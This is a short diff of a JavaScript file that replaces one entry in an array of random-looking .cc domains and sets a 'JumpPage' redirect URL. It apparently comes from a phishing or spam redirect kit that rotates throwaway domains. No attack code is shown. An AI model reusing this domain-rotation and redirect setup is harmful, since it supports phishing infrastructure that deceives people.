@@ -39,7 +39,7 @@ var emails = [
 var urls=[
 	'puzdplur.cc/', 
 	'ttohmtjog.cc/', 
-    'qcvrpuvmo.cc/',
+    'tbzkrylm.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://atjxcwxet.com";
